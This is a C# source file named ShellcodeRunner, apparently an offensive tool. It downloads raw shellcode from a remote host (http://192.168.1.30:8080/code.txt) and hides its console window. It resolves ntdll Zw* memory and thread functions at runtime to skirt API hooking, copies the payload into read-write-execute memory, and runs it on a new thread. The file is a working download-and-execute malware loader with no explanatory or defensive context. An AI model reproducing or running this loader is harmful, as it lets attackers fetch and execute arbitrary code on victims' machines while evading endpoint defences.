using System;
using System.Net;
using System.Runtime.InteropServices;

namespace ShellcodeRunner
{
    class Program
    {
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint CREATE_SUSPENDED = 0x00000004;
        const uint WAIT_INFINITE = 0xFFFFFFFF;

        delegate int ZwAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);
        delegate int ZwFreeVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint FreeType);
        delegate int ZwCreateThreadExDelegate(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Argument, uint CreateFlags, uint ZeroBits, uint StackSize, uint MaximumStackSize, IntPtr AttributeList);
        delegate int ZwWaitForSingleObjectDelegate(IntPtr Handle, bool Alertable, IntPtr Timeout);
        delegate int ZwProtectVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        static void Main(string[] args)
        {
            WebClient client = new WebClient();
            string url = "http://192.168.1.30:8080/code.txt";
            byte[] shellcode = client.DownloadData(url);

            IntPtr ntdllModule = LoadLibrary("ntdll.dll");

            IntPtr zwAllocateVirtualMemoryAddr = GetProcAddress(ntdllModule, "ZwAllocateVirtualMemory");
            IntPtr zwFreeVirtualMemoryAddr = GetProcAddress(ntdllModule, "ZwFreeVirtualMemory");
            IntPtr zwCreateThreadExAddr = GetProcAddress(ntdllModule, "ZwCreateThreadEx");
            IntPtr zwWaitForSingleObjectAddr = GetProcAddress(ntdllModule, "ZwWaitForSingleObject");
            IntPtr zwProtectVirtualMemoryAddr = GetProcAddress(ntdllModule, "ZwProtectVirtualMemory");

            var zwAllocateVirtualMemory = (ZwAllocateVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(zwAllocateVirtualMemoryAddr, typeof(ZwAllocateVirtualMemoryDelegate));
            var zwFreeVirtualMemory = (ZwFreeVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(zwFreeVirtualMemoryAddr, typeof(ZwFreeVirtualMemoryDelegate));
            var zwCreateThreadEx = (ZwCreateThreadExDelegate)Marshal.GetDelegateForFunctionPointer(zwCreateThreadExAddr, typeof(ZwCreateThreadExDelegate));
            var zwWaitForSingleObject = (ZwWaitForSingleObjectDelegate)Marshal.GetDelegateForFunctionPointer(zwWaitForSingleObjectAddr, typeof(ZwWaitForSingleObjectDelegate));
            var zwProtectVirtualMemory = (ZwProtectVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(zwProtectVirtualMemoryAddr, typeof(ZwProtectVirtualMemoryDelegate));

            FreeConsole();

            IntPtr allocMemAddress = IntPtr.Zero;
            IntPtr size = (IntPtr)shellcode.Length;

            int status = zwAllocateVirtualMemory(GetCurrentProcess(), ref allocMemAddress, IntPtr.Zero, ref size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            if (status != 0)
            {
                Console.WriteLine($"ZwAllocateVirtualMemory failed with error code: {status}");
                return;
            }

            Marshal.Copy(shellcode, 0, allocMemAddress, shellcode.Length);

            uint oldProtect = 0;
            status = zwProtectVirtualMemory(GetCurrentProcess(), ref allocMemAddress, ref size, PAGE_EXECUTE_READWRITE, out oldProtect);

            if (status != 0)
            {
                Console.WriteLine($"ZwProtectVirtualMemory failed with error code: {status}");
                return;
            }

            IntPtr threadHandle = IntPtr.Zero;
            status = zwCreateThreadEx(out threadHandle, 0x1FFFFF, IntPtr.Zero, GetCurrentProcess(), allocMemAddress, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);

            if (status != 0)
            {
                Console.WriteLine($"ZwCreateThreadEx failed with error code: {status}");
                return;
            }

            zwWaitForSingleObject(threadHandle, false, IntPtr.Zero);

            status = zwFreeVirtualMemory(GetCurrentProcess(), ref allocMemAddress, ref size, 0x8000);

            if (status != 0)
            {
                Console.WriteLine($"ZwFreeVirtualMemory failed with error code: {status}");
                return;
            }

            Console.WriteLine("Shellcode executed");
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool FreeConsole();

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    }
}
